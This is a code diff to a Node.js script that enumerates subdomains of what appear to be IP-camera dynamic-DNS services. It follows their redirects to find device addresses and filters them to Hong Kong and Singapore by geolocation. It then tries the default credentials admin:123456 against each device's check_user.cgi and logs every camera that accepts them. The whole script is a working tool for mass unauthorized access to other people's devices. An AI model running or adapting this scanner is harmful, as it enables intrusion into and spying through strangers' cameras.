@@ -1,16 +1,34 @@
 var request = require('request');
+var winston = require('winston');
 var sleep = require('sleep');
 var satelize = require('satelize');
 
+var logger = new (winston.Logger)({
+  transports: [
+  	new (winston.transports.Console)(),
+    new (winston.transports.File)({
+      name: 'info',
+      filename: './log/device.info.log',
+      level: 'info'
+    }),
+    new (winston.transports.File)({
+      name: 'error',
+      filename: './log/device.error.log',
+      level: 'error'
+    })
+  ]
+});
+
 var url = '';
 
-for(a=111 ; a<112 ; a++) {
+
+for(a=118 ; a<119 ; a++) {
 	for(b=97 ; b<123 ; b++) {
 		for(c=97 ; c<123 ; c++) {
 			for(d=97 ; d<123 ; d++) {
-				url = 'http://' + String.fromCharCode(a,b,c,d) + '.easyn.hk';
+				url = 'http://005' + String.fromCharCode(a,b,c,d) + '.nwsvr1.com';
 				getLink(url);
-                sleep.usleep(500);
+                sleep.usleep(5000);
 			}
 		}
 	}
@@ -19,8 +37,8 @@ for(a=111 ; a<112 ; a++) {
 //url = 'http://002mhew.nwsvr.com';
 //getLink(url);
 function getLink(url) {
-	//console.log(url);
-	request({url: url, followRedirect : false}, function (error, response, body)	{
+    //console.log(url);
+	request({url: url, followRedirect : false}, function (error, response, body) {
 		
 		if (!error && response.statusCode == 302) {		
 			//console.log('Get url : ' + response.headers['location']);
@@ -39,7 +57,7 @@ function checkCountry(url,link) {
     try {
     satelize.satelize({ip:ip}, function(err, payload) {
         try{
-            if((payload.country_code == 'HK') || (payload.country_code == 'SG')){	
+            if((payload.country_code == 'HK') || (payload.country_code == 'SG')) {
 			    login(url,link); 
             }   
         }
@@ -50,10 +68,11 @@ function checkCountry(url,link) {
 }
 
 function login(url,link) {
-	link = 'http://admin@' + link.substr(7) + '/check_user.cgi';
+	link = 'http://admin:123456@' + link.substr(7) + '/check_user.cgi';
+
     request({url: link}, function (error, response, body) {
     if (!error && response.statusCode == 200) {
-        console.log(url);
+        logger.log('info','%s',	url);
     }
 		
     });	
